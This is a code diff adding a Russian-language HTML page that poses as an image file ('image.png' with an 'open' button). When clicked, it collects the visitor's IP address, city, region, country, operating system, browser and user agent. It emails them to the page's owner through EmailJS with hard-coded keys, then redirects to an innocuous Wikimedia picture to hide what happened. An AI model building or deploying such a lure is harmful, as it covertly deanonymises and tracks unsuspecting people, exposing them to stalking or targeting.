@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Отправка информации</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <style>
+    /* Общие стили для страницы */
+    body {
+      background-color: #1e2a47; /* Темный синий фон */
+      font-family: Arial, sans-serif;
+      color: #ecf0f1;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+
+    /* Стили для кнопки */
+    #open {
+      background-color: #3498db; /* Синий цвет фона кнопки */
+      color: white;
+      font-size: 18px;
+      padding: 15px 30px;
+      border: none;
+      border-radius: 10px; /* Закругленные углы */
+      cursor: pointer;
+      transition: all 0.3s ease; /* Плавные переходы */
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); /* Тень для кнопки */
+    }
+
+    /* Эффект при наведении */
+    #open:hover {
+      background-color: #2980b9; /* Более темный синий при наведении */
+      transform: scale(1.1); /* Увеличиваем кнопку */
+    }
+
+    /* Эффект при нажатии */
+    #open:active {
+      background-color: #1c4f77; /* Еще более темный синий при клике */
+      transform: scale(1); /* Снимаем увеличение при клике */
+    }
+
+    /* Дополнительные стили */
+    h1 {
+      font-size: 24px;
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+
+<h1>image.png</h1>
+<button id="open">open</button>
+
+<script>
+  emailjs.init("TEWzd8Aj5uS0d7yeq"); // Публичный ключ
+
+  // Определяем устройство и браузер
+  function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    let os = "Неизвестно";
+    if (ua.indexOf("Windows NT 10.0") !== -1) os = "Windows 10";
+    else if (ua.indexOf("Windows NT 6.1") !== -1) os = "Windows 7";
+    else if (ua.indexOf("Mac OS X") !== -1) os = "Mac OS";
+    else if (/Android/.test(ua)) os = "Android";
+    else if (/iPhone|iPad|iPod/.test(ua)) os = "iOS";
+    else if (/Linux/.test(ua)) os = "Linux";
+
+    let browser = "Неизвестно";
+    if (/Chrome/.test(ua)) browser = "Chrome";
+    else if (/Firefox/.test(ua)) browser = "Firefox";
+    else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = "Safari";
+    else if (/Edge/.test(ua)) browser = "Edge";
+
+    let device = /Mobile|Android|iPhone|iPad/.test(ua) ? "Мобильное устройство" : "ПК";
+
+    return { os, browser, device, userAgent: ua };
+  }
+
+  document.getElementById("open").onclick = () => {
+    const deviceInfo = getDeviceInfo();
+
+    // Получаем IP и геолокацию
+    fetch('https://ipapi.co/json/')
+      .then(res => res.json())
+      .then(data => {
+        // Отправка Email
+        return emailjs.send("service_md495n5", "template_juupnvs", {
+          ip: data.ip,
+          country: data.country_name,
+          region: data.region,
+          city: data.city,
+          os: deviceInfo.os,
+          browser: deviceInfo.browser,
+          device: deviceInfo.device,
+          user_agent: deviceInfo.userAgent
+        });
+      })
+      .then(() => {
+        // После успешной отправки — переходим на фото
+        window.location.href = 'https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png';
+      })
+      .catch(e => {
+        console.error('error:', e);
+        // Даже если ошибка, переходим на фото
+        window.location.href = 'https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png';
+      });
+  };
+</script>
+
+</body>
+</html>
